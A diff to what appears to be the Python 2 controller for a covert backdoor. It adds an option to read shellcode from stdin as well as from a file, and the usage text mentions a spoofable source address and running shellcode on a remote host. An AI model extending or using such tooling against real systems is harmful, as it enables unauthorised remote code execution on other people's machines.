@@ -10,7 +10,7 @@ def usage():
    print "\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)"
    print "\t\tiface: interface to send from and listen on (Default: eth0)"
    print "\t\tsrc_ip: the address we want to send from (Can be anything)"
-   print "\t\tshellcode_file: send shellcode from this file to run on the host"
+   print "\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin"
    print
    sys.exit(0)
 
@@ -81,11 +81,15 @@ def start_listener(iface, *args):
 
 def send_shellcode():
    global MSG_TYPE_SHELLCODE, magic, iface, shellcode_file
+   shellcode = ''
 
    # Open and read the shellcode
-   f = open(shellcode_file, 'r')
-   shellcode = magic + MSG_TYPE_SHELLCODE + f.read()
-   f.close()
+   if shellcode_file == '-':
+      shellcode = magic + MSG_TYPE_SHELLCODE + sys.stdin.read()
+   else:
+      f = open(shellcode_file, 'r')
+      shellcode = magic + MSG_TYPE_SHELLCODE + f.read()
+      f.close()
 
    # Get the required crypto bits
    key_info = generate_key_info()
